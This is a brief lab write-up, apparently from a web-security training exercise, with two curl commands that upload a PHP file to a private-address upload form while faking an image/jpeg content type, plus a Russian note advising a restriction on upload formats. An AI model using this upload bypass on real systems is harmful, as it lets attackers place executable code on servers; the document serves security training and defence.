echo '<?php echo "File Upload" ?>' > /tmp/script.php && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/script.php;type=image/jpeg" "http://192.168.56.110/index.php?page=upload" > script.html

curl -F "Upload=send" -F "uploaded=@script.php;type=image/jpeg" http://192.168.56.110/index.php\?page\=upload > script.html



Как защититься?
1. Ограничить формат загружаемых файлов, чтобы выгрузить можно было только изображения.

